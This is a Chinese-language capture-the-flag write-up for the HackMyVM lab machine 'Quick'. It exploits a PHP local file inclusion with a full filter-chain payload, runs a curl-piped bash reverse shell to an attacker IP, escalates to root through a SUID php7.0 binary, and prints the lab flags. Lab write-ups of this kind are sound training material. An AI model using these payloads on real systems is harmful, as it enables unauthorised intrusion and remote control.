# Quick

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=Quick

## IP

192.168.5.40

## Scan

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Quick Automative
```

访问 80 web 首页 http://192.168.5.40/index.php?page=home 发现 page 参数可能存在 LFI 漏洞，可以通过 php filter chain 进行利用：

https://github.com/synacktiv/php_filter_chain_generator

```
http://192.168.5.40/index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

可以看到 phpinfo 的显示信息，证明利用成功。

利用上面的 py 脚本，生成反弹 shell 的内容，因 URL 长度有限制，需要将 ip 转换成数字，sh 内容写入到文件中然后 curl 访问执行：

```
8.sh 的内容为：
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1

python3 php_filter_chain_generator.py --chain '<?=`curl 3232236803/8.sh|bash`;?>'
```

在反弹的 shell 中访问 user flag 文件：

```
www-data@quick:/home/andrew$ pwd
/home/andrew
www-data@quick:/home/andrew$ cat user.txt


                                 _________
                          _.--""'-----,   `"--.._
                       .-''   _/_      ; .'"----,`-,
                     .'      :___:     ; :      ;;`.`.
                    .      _.- _.-    .' :      ::  `..
                 __;..----------------' :: ___  ::   ;;
            .--"". '           ___.....`:=(___)-' :--'`.
          .'   .'         .--''__       :       ==:    ;
      .--/    /        .'.''     ``-,   :         :   '`-.
   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|
  : "  /\__/\____//   """      /     \\ :         :  : :|'||
["""""""""--------........._  /      || ;      __.:--' :|//|
 "------....______         ].'|      // |--"""'__...-'`\ \//
   `|HMV{QUICK-user}|.--'": :  \    //  |---"""      \__\_/
     """""""""'            \ \  \_.//  /
       `---'                \ \_     _'
                             `--`---'
```

寻找提升 root 的路径，发现 /usr/bin/php7.0 有 suid 权限，直接得到 root 权限：

```
/usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
```

最终得到了 root flag：

```
# cat root.txt

            ___.............___
         ,dMMMMMMMMMMMMMMMMMMMMMb.
        dMMMMMMMMMMMMMMMMMMMMMMMMMb
        |        | -_  - |        |
        |        |_______|___     |
        |     ___......./'.__`\   |
        |_.-~"               `"~-.|
        7\         _...._        |`.
       /  l     .-'      `-.     j  \
      :   .qp. / __________ \ .qp.   :
      |  d8888b |          | d8888b  |
  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
 /     : /,------------------------.:    \
:      |`.    | | [_FLAG_] ||     ,'|     :
`\.____|  `.  : `.________.'|   ,'  |____.'
  MMMMM|   |  |`-.________.-|  /    |MMMMM
 .-------------`------------'-'-----|-----.
(___HMV{6ff5f1b9238a96b3c3871c67a215ec80}__)
  MMMMMM                            MMMMMM
  `MMMM'                            `MMMM'
```

最后看看 index.php 中的 LFI 漏洞是怎么形成的：

```
<?php
    if (isset($_GET['page'])) {
        $page = $_GET['page'];
    } else {
        $page = 'home';
    }
    include($page . '.php');
?>
```
